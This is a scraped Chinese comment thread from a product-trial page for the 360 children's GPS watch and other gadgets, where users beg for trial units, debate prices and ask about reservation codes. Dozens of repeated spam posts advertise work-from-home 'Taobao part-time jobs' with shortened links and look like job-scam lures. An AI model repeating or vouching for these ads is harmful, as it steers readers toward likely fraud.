孩子调皮 一眨眼就找不到人 特别是商场 这边买东西 那边跑去看别的啦 真担心 有了儿童卫士 随时手机定位 安心点
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
期待。。。
真心希望能得到试用的机会，天下父母心啊
再也不用像西游记三打白骨精里一样，女儿，女儿，的乱叫了。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】 
这个值得期待啊。。。
这样的好东西，真希望早日发售，最好物美价廉～～～
真的好期待
希望360越办越好 当然也少不了我的手表 此致 敬礼
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
U盘才8G，再大些就好了
听着很神奇 
死呀 ，网页里面的音乐吓了我一下~~我艹
要揭晓了 快了 
如果能申请成功，可以做儿童节礼物，我可是一直坚持着使用360的忠实用户，好多人劝我不要用360了，我依然坚持到现在
希望可以中T3空气卫士吧 
一次性的就应该便宜点！2块钱一个
价钱20—30元人民币是最合理的！
期待啊！价钱应在15-20元人民币合理
我看最多也就300元人民币！发明这个就是给大众人用的，你要那么贵价钱干什么啊？鬼都不放过你！
为那些离异家庭的孩子们长点儿心吧！父母应该为孩子准备这个
好贵  主要就是好看  最好是有打电话功能就更好了
不错啊，希望面一点别超过500元人民币
希望能选中
这个手表太好了，要是便宜我一定会买
希望360儿童卫士，越做越好，
那你打击他干什么，你应该祝愿她能获得 
希望设计师天天身体健康，希望手表再做得更隐蔽点，得到了的别太显摆
挺好的，希望设计成功 
希望能申请成功。
已经设计出来了吗
当时叫奇虎的时候就在用，老用户希望能申请成功！！！
希望能中，因为我打算给女儿六一儿童节礼物
换成usb4.0多加点钱也好啊
真心的好东西，这样在玩乐中，不怕找不到孩子，应该早点推出
希望能中，带着360儿童卫士伴随儿子的成长！！！
强烈期待中!!!!!!!!!!!!!!!!!!  
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
预约不到，什么时候可以购买啊？
手表底部最好不要用金属材质，不然容易引起皮肤不适！~
如果可以有一个视频功能就好了，可以手机控制打开视频。这样就可以更快的发现在什么位置了
好东西就是给孩子的，以后就不怕找不到孩子了。
今年过节不收礼，收礼只收T3空气卫土。
好东西就是给孩子的，以后就不怕找不到孩子了.真心希望能得到试用的机会，天下父母心啊.
我都有两个了，很不错啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】   
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
希望能中！！
宝宝非常想要，给我一个吧
希望快快上市，强烈支持奇酷，支持奇虎360！！！ 
低于千分之一的概率，感觉压力好大哦
姑娘很漂亮
希望是渺茫的   支持这款产品
..希望创意可以采纳
我宝宝度日如年啊，他真想要一个！
能有温暖的芯片
1000分之1的可能性，哎！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
希望能中，因为我打算给女儿六一儿童节礼物 
很好！！！！1111！!!!!!!!!!！!!!!!!!!!!!!!!!!!
TNTAUW
给我一个吧
让爱一路随行，不要再有失去不要再有痛苦，谢谢360儿童卫士研发的这款产品，人性化设计漂亮的外观，还有最重要的是充满了爱的关怀。每年中国走失儿童太多，让众多家长为之心痛、心碎，希望能够帮助像我一样众多需要的家长们和孩子们，最后向广大参与研发这款产品的人员致以衷心的感谢！！！
送货要不要钱?
送货要不要钱?
作死啊，永久使用么？这么贵
续航能力多久啊
坑爹那，这额么贵
非常好啊，but支持中文么？良心来说价格也合理，但是对国人来说确实贵了
没市场的产品，根本就没有做过市场调查 
200元差不多，贵了。东西是不错。。。
逗狗？？？
屌丝，没看到写的是“创意中”么
智慧医疗，小企业可望而不可及
选我选我选我
第三张有两点
我想要那个
怎么不卖那  自己买也行啊  老是那么点  全国孩子有多些 
幸运获得预约码，期待520
我喜欢智能
期待中奖，360一定支持到底。 
我也要么，奇酷小编能给我一个吗？
装在哪里的？如何安装，看似装在行车电脑上，但有那样的针脚吗？支持那些车型？
跟腾讯的一样吗？
149美元？？你不用筹了，回家洗洗睡吧
孩子很喜欢，希望能给一个机会。
为啥我已经预约了 却仍然没有受到预约码啊？ id就是这个id啊 邮箱是sby3383138@126.com的 请帮帮我啊！
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
我很希望能给我 的父亲申请一个试试，今天又跑走了。一家人找了好久才找到。望能考虑
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
我也要!我也要！奇酷你就给我一个吧!
给老人申请一个也算是给这个产品坐个功能上的延申吧。
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
奇酷，我要、我要。你就给我个嘛 
第一次没赶上时间，第二次已经参加了，不知道能否得到360的“照顾”呢，哈哈，期待好运的来临了。
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
我要给孩子一个，奇酷你就给我一个啦！！！
功能这么好，小巧轻便，我好期待哟。强烈支持奇酷，支持奇虎360！！！
很赞。看看价格，值得考虑啊。
期待中奖，360一定支持到底。
420873925
这东东确好，希望我的申请能中，这样我有更多的机会爱我的孩子。强烈支持奇酷，支持奇虎360！！！
全是刷屏的，我也想刷一下引起注意，但还是别刷了，大家都刷就把小编累坏了
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
这样一面钟是很方便，期待着上市。强烈支持奇酷，支持奇虎360！！！
我很是期待，如果在进一步改进就更好了。
好东东，值得拥有。强烈支持奇酷，支持奇虎360！！！
孩子超喜欢，希望能中奖，支持360
要是储电量再大些，路程能跑得再远些就更好了。尽管如此也不失为一件好东东，值得拥有。强烈支持奇酷，支持奇虎360！！！
这个创意应该有很广阔的前景，因为它的作用在以后绝不是单一的，会在很多方面发挥作用。前提是，对人脑的脑电波有详细的了解，不知道相关的理论何时可以实现。
其实快速充电有一个很大的弊端，就是对电池的耗损相当厉害，严重缩短电池的寿命，至少现在的技术是这样的。如果，这个技术可以攻破这个问题的话，会有很大的市场，否则很难估计。快速充电技术，利用模拟电子和数字电子技术估计应该不是很难，主要还是减少电池的损耗！加油，相信奇虎的研究团队！
对于数码控来说，超喜欢！是像我从事摄影的好帮手
期待试用～送我一个呗！
期待试用～送我一个呗！ 
期待试用～送我一个呗！ 
太贵了，，，不会有人买的
什么时候出来呢
支持360
这个真心不错 准备入手
支持360儿童卫士
360儿童卫士2设计好赞啊！！！
超级想要一个！！！希望小编能完成我的心愿
360儿童卫士2设计好赞啊！！超级想要一个！！！希望小编能完成我的心愿 ！！！支持360儿童卫士
360的产品非常好，我们全家都喜欢。我家小孩非常想要，希望能拥有360儿童卫士。小编，能否给一个？
太贵，功能没有特别创新的地方，和普通电瓶车差不多，只是轻了，多出仪表盘而已
太贵，功能没有特别创新的地方，和普通电瓶车差不多，只是轻了，多出仪表盘而已
楼主是不是搞错了？你去对比米健就知道那个好了？？其实是一样的东西，你去下载米键APK也可以用，比360的好用多了！觉得好用就感谢我 哦！
想法和创意都不错 具体在社会上的反响怎么样还有待考察，但是创意非常吸引人的眼球，抓住了部分消费者的和父母的心理。从实际出发的话，应该可以有不错的反响。我也和希望可以申请到试用。期待。
来一个。好喜欢啊。支持360
我们全家期盼给个机会！
在我爱发明看过这东西，用的是陀螺仪。感觉不过，有机会    弄一个。
非常期待，就算得不到试用机会也想买一个
妈咪妈咪哄 手表出现
支持那么多次了       海带中一次啊
这表子能买吗 
你也可以创想小硬件 速嵌帮你实现www.quickembed.com
我家小孩真是太......希望能有一个。
好希望申请成功哦！
希望能选上！
选上选上选上选上选上选上选上选上选上选上选上选上
有木有3的？
分辨率是硬伤，不要求1920*11080吧，至少应该也搞一个1024*768呀
看视频有点模糊，所以还是淡定
希望能够绐我一个
什么时候能送货我星期五晚上申请的
我抢到了，太爽了
家有顽皮小家伙，经常到处跑，申请试试能否满足我的要求
功能这么好，小巧轻便，我好期待哟。强烈支持奇酷，支持奇虎360！！！ x2
我也预定了，但是没收到预约码，神马情况？lizhengqiang789@126.com 
期待试用～送我一个呗！  我们全家期盼给个机会！孩子超喜欢，希望能中奖，支持360这东东确好，希望我的申请能中，这样我有更多的机会爱我的奇酷，我要、我要。你就给我个嘛 孩子。强烈支持奇酷，支持奇虎360！！！ 
要是有按年龄分大小规格，那就更棒了！
有没有白色灰色款，那样是不是更低调一点，呵呵呵·
喜欢这样一体成型，结实，美观！
这好时尚啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】^
支持啦那么多次，也是用心填写的~ 保佑……
这么多次了  一次都没成功  这次中一次行不行啊 真心的！！！！！
我的手机操作系统是ios
喜欢这样一体成型，结实，美观！ 
期待试用～送我一个呗！ 我们全家期盼给个机会！孩子超喜欢，希望能中奖，支持360这东东确好，希望我的申请能中，这样我有更多的机会爱我的奇酷，我要、我要。你就给我个嘛 孩子。强烈支持奇酷，支持奇虎360！！！  
360总能有些新奇的东西！
期待试用～期盼给个机会！孩子超喜欢，希望能中奖，支持360，这东东确好，希望我的申请能中，这样我有更多的机会爱我的奇酷，支持奇虎360！！！ 
我家宝宝就爱到处跑，好想拥有这款宝贝
非常好的产品，具有一定的推广意义。
如果能打电话就更好了
BJGHUIG 
预告.合肥开始了
很有创意的儿童安全产品，但最后不要打上360安全的标志，万一在危险情况下被坏人识破就不好！强烈建议！
这不是上过TED的那个吗？这售价还算不错了，就是希望功能能再实用一点
希望能拿到一个
这创意真垃圾，还不如加个专属的键，来个一键搜索呢
100以内再加上稍微宣传一下音质还可以接受
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
希望能支持我，喜欢我身边的朋友会给你带来宣传。
专业人贩子比你清楚多了，打不打意义都不大
传说中的毁电池
有创意的儿童安全产品，但最后不要打上360安全的标志，万一在危险情况下被坏人识破就不好！强烈建议！ 
早就有了，为什么创意。变压而已。
这款手表看介绍挺好的！
( ^_^ )不错嘛
看来挺好，赞一个  
我正在参加奇酷网的#奇酷试用#活动，好想要免费试用的360儿童卫士 2啊。一共100台呢，快来帮我催一下奇酷小编，让他们赶紧把我选出来！转的人越多，我中签的几率越大，有钱没钱都来帮我捧个人场。 （分享自 @Qikoo奇酷网） http://t.cn/heruD
我正在参加奇酷网的#奇酷试用#活动，好想要免费试用的360儿童卫士 2啊。一共100台呢，快来帮我催一下奇酷小编，让他们赶紧把我选出来！转的人越多，我中签的几率越大，有钱没钱都来帮我捧个人场。 （分享自 @Qikoo奇酷网） http://t.cn/heruD
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】 !
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】 #
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
感觉还不错，一定要成功，O(∩_∩)O
满心地期待有惊喜哦
你可以滚吗
我擦在哪都可以看到你这个逗逼，广告党死全家啊
非常期待！！！！！！！！！！！！！！现在很多时候都找不到东西，会非常烦，有了这款机器，一定会很舒心！！！！！！！！！！！爱,奇酷！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
华为你太坑老花粉了，居然不我公测名额
居然不给我公测名额
非常好啊啊！！！！现在的时代，最怕孩子走丢，这款手表竟能找到孩子，又能听到声音，了解孩子的状况，实在是1级棒！还有附加的检测运动情况，实在是好啊。不在孩子身边也能监督孩子做运动锻炼身体了！！！！！！！！！！！！！！！非常想要！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！   
我很期待啊。啊
多少？？？？？           
这么多次了 一次都没成功 这次中一次行不行啊
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
没有预订到😔
唔，申请中哇...期待试用~
呵呵，电池杀手
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
呵呵，好像很容易碎屏，就那么轻轻一磕，卡，碎了
性能不错，像素高，价格还不贵，嗯，不错 
这个绝对是个好东西，必须支持
确实是好东西，
能够在提高点象素就相当好了
六千多，蛮贵的，可以便宜点吗
如果能够价格上调整，这个是不错的选择
这个两口子在家穿就好了，不适合户外吧
要钱吗 好多钱
杭州雾霾就拜托你了呵呵
还有一天就公布了
不知道天天祈祷有没有效果
这个上网要插手机卡的 走的手机流量
期待该产品
就是有点贵 啊
我预约到了，就等5月20日的到来了
我的手机手环客户端都下好了，等着呦！
感谢支持~
有卖的么，多少钱，我想买
奇酷，360你就给我一个嘛！天天想着这个哦！“茶饭不思”
啥时候有卖？快点哦！
“精准定位、近距离防止孩子走失、实时录音、材料安全无害” 只有这些功能吗，没有SOS紧急呼救吗？
他这是监控插在插座上面电器的耗电吧
好          ，赞   
很期待啊，看看自己运气好不好能否试用下
我非常需要
这里不是华丽和感动申请的理由，而是对孩子的关爱，使用是一种态度。安全是一种责任，360儿童卫士就是让大家在寻找这种安全，所以我想试用。同时也是大家都想试用！谢谢
关键是电池能撑多久。
希望抽中我啦~
我的是大神f1，总出现黑屏现象。
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
7.8099W
我一直在用mx一代，感觉真的很棒，目前为止都没换手机的念头，支持魅族！
挺好的，就是价格偏贵
建议，还应该可以再人性化点，功能多一些，不简简单单的只打开一个程序，可以拓展下功能，比如说可以控制电脑，上传文件，手机之间可以来回传输文件等，当然，只是想法！ 
戳中我😭
什么时候才买
太贵了，而且没直接插电，还不如直接买快充
有避孕？？？？
再小点吧!!!!!!!!!!!!!!!!!!!!!!
骚瑞，西门大妈~
我改了       是是
好期待，可是我网络我微薄密码了，催不了啊，希望人品爆发吧....
S B 人家早就开始卖了 399一个  凸  笑而不语
可以自己调节距离的
看着蛮不错的样子，不知是否好用
0000000
我要试用，第一次试用就给一次机会嘛
这么多次了 一次都没成功 这次中一次行不行啊 真心的！！！
确定是520发售吗？
很智能的打火机哦，适合商务人士！
期待......
两天没见，达到了十万啊，看来看是众望所归啊！希望申请试未成功的用户可以有优先购买权，谢谢
按同类型产品，同功能产品来定位好像这个价也还可以接受！可折叠，电动车、自行车、山地赛车的多种功能。问题是这么多产品集一身，到底想卖给哪个类型的客户！普通上班族，人家只需要电动车的功能！功能太多不是好事，要有这个细分市场的人群！简单说就是产品市场定价不好！价格太高了所以销量不会太大！！一个产品要么定位高端，要么定位大众化！本人浅见！
为什么未收到预约码.
很实用的东西，办公利器！
确实是健康好助理哦！很人性化的智能产品！
绝对好东西！价格降下来，普及大众！取代英语考试！人类的一大进步！
一次性产品也太贵了吧...
显示预约成功了，为什么到现在还没收到预约吗？
太贵太贵TAT
安全是个很值得注意的问题！
无话可说了，等到今天也没有售后再联系……就这样的售后，怎么样打开市场？麦步，走开吧！
！！！！！是不是小编看了评论 被抽中的几率就会越大的呀-.-
那个拿绿色包包的美女有没有在抽奖中*.*
期待中...
总体来说智键非常不错  我的双击电筒不能用 不知道其他人有没有这个情况           
这个应该跟那个空气净化器一起组合用然后用智能家居联网。
绝对期待中
好像太大了吧
要是能加入智能语音控制芯片就好了，用手机还是蛮麻烦的。直接说话不更方便？况且现在市场上做得比较好的类似的产品也不少。
预定成功，为什么没收到预定了码？
广告狗，，滚！！！！！！！！！！！！！！！！！！
祝自己好运！
8900都去买摩托了，说不定还可以买个八成新的奇瑞QQ
绝对是期待ing
1000多还不如装个门磁得了
祈祷···············
好运连连看啊，希望我能有好运中个小马宝宝，感谢大家祝福
强烈等待！
2000多都买一个更好的投影仪了
没收到码？求解释！！！！
智能家居确实就要来了。
好神奇的产品，非常喜欢，期待试用。。。
这个界面也太丑了吧
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
为什么我没有收到码？？？
给自己 找份宅家的网络 差事吧～ ～不限制工作时 间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
在外形上的改进还有很多的空间啊。
好东西，看看价格如何！
不知道长期使用影响大脑不？
这个是好东西，只是价格太高，一次性就更不亲民了，要是能改良，提高性价比绝对有卖点，期待啊！！！
抽奖结果为何一推再推啊？？
小孩上学远，也刚上一年级，现在也正是小孩子学习独立的时候，但还是会不放心她自己上学，所以如果有了这个就能彻底解决这个问题了，所以以强烈要求试带，反馈意见
智能办公啊。智能。
祝自己好运！ 
啥时候公布啊？？坐等
难道我来晚了，咋不能申请了！
结果从11点推到2点，官方说话还算数么，一点诚信都没有
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
好东西 就看价格怎么样了
一直支持360的，也很喜欢360，感觉360团队一直在创新，一直在努力，很符合我们年轻人向上的精神！
喜欢  刚才找了下发现有类似的东西 价格也挺高的
好东西，我觉得值得拥有！
这个多少钱？
这个真心不错，特别是现在文档多，手机ocr没找到很理想的应用。
好东西。。高科技盆栽。。再也不用担心出差回来看到花都枯死了
等待结果的公布 
如果能有自动裁剪功能就好了。。可以完全不用管他
好东西。。上传小说就不用一个字一个字的打了。。
预定成功，为什么没收到预定了码？ 
预定成功，为什么没收到预定了码？ ...........
身边有星星儿的电子控拼命申请中……
预约码没有收到，查也查不到..郁闷
期待中。。。
继续360路由器邀请优购码，真心需要，好人一生平安。249150417@qq.com。感谢感谢。
已经申请过，希望可以试用
希望好运的降临。。。
希望能申请到
已经有的买了，东西是真心不错，不过就是价格很高啊
这个也太强大了。那样对于喜欢养花花草草的我来说，是不是我可以下岗了。呵呵
预约成功，为什么没收到预约码？？京东也没有上架？？求解释！！
我预约成功了3次，如果有收到预约码就卖你一个··
有个毛用,不要想当然
很希望宝宝能够用上
如果399可以再开放购买的话，那一定入手一个，现在的599真心下不去手啊
希望能申请到. 
希望能申请到. 
只能养一丁点东西 
骗人的??当天下午刚出不久就预约了 成功了`现在还没收到~
什么时候可以购买啊，一直在等，希望能快的推出
无奈的等待幸运降临
根本就没收到！我都几个号来预约了！都说预约成功！可到现在都19号了也没动静！悲哀(⊙o⊙)哇！
求给个解释？预约成功没动静！
很好的东东，希望可以拥有。。。
有创意,组合命令 
太帅了 爱死奇酷了
等待中，公布吧
关键是距离有多远，红外线控制，难道你每个房间放一台？
不错不错，好的
赶紧发售吧，等不及了
正是孩子能用着的时候，最近偷小孩的人特别多，我简直快要等不及了，实在不行我只能先选择其他的产品了
为什么你每次都能抽到呢？？半碗神仙茶  儿童卫士  你也抽到了？  你是有多幸运？？？？无语了
为什么你每次都能抽到呢？？半碗神仙茶 打印3D 你也抽到了？ 你是有多幸运？？？？无语了  
现在也正是小孩子学习独立的时候，但还是会不放心他自己上学，所以如果有了这个就能彻底解决这个问题了，所以以强烈要求试带，反馈意见  
家里小孩正需要这个，想问问什么时候可以买到。
看到介绍，我理解的意思，只在于没有4机手机，办另一张4G套餐卡来开启WIFI,前提还得你处于4G网络覆盖区，然后才能实现用自己2G/3G手机上4G网，自己得掏钱买流量，当然还要“360随身WIFI 4G版”。我说，有这个必要吗？
分享一个小故事，关于我妹妹的，故事名 童说土豪，在一个朋友聚会上，我和妹妹去参加聚会，有几个朋友在，调侃他们的朋友，说朋友真有钱有车有房，真是个土豪，我妹妹上去说了句话，说土豪傻傻的很有钱，朋友们都笑了， 朋友们说，说的真好。 
恭喜恭喜。
没办法，只能等下次了 
